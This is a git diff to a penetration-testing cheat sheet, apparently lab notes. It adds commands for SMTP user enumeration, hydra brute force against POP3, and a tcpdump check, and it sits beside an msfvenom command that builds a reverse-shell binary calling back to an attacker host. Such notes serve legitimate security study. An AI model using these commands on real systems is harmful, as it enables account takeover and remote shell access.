@@ -289,7 +289,12 @@ hydra -l users.txt \
    nc TARGET 25
    HELO me
    ```
-## Check if the exploit work with tcpdump 
+## smtp enumerate user
+```bash
+sudo perl smtp-user-enum.pl -M VRFY -U /opt/seclists/Usernames/Names/names.txt -t 192.168.211.137 
+```
+
+# Check if the exploit work with tcpdump 
 ```bash
 sudo tcpdump -i tun0 -n -vv icmp
 ```
@@ -297,4 +302,9 @@ sudo tcpdump -i tun0 -n -vv icmp
 # Create an exploit with msfvenom
 ```bash
 msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=$IP LPORT=$port
+```
+
+# Brute force POP3/IMAP 
+```bash
+hydra -L valid_users.txt -P passwords.txt pop3://$IP
 ```
